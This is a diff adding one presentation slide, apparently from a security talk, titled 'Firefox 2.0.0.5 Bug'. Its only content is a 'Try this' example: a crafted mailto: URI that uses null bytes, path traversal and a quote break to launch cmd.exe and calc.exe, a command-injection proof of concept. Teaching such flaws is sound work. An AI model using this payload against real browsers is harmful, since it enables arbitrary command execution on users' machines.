@@ -1,0 +1,7 @@
+<slide title="Firefox 2.0.0.5 Bug">
+
+<break lines="7" />
+
+<example fontsize="1.2em" type="shell" title="Try this" marginleft="1em" marginright="0em"><![CDATA[mailto:%%00%%00../../../windows/system32/cmd".exe ../../../windows/system32/calc.exe " - " blah.bat]]></example>
+
+</slide>
